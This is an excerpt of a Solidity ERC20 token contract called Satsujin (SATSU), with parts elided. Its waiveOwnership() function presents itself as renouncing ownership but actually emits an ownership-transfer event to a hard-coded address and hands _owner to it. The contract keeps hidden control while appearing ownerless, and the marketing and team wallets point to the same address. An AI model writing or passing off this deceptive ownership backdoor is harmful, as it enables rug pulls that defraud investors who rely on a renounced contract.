...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x88e8f88972c92dC75E9c5EB876ed712944e8e1EC));
        _owner = address(0x88e8f88972c92dC75E9c5EB876ed712944e8e1EC);
    }
...
contract Satsujin is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Satsujin";
    string private _symbol = "SATSU";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x2423C664b05dD230b7dFcF177EB9aa5cb6C9F3d0);
    address payable public teamWalletAddress = payable(0x2423C664b05dD230b7dFcF177EB9aa5cb6C9F3d0);
